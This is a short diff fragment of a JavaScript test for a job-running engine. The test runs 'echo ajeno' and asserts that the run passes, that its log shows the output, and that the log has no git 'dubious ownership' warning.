+  const { run, id } = await engineRun(t, queue, repo, dir, "echo ajeno");
+  const log = readFileSync(queue.logPath(id), "utf8");
+  assert.doesNotMatch(log, /dubious ownership/);
+  assert.equal(run.state, "passed", log);
+  assert.match(log, /ajeno/);
 });
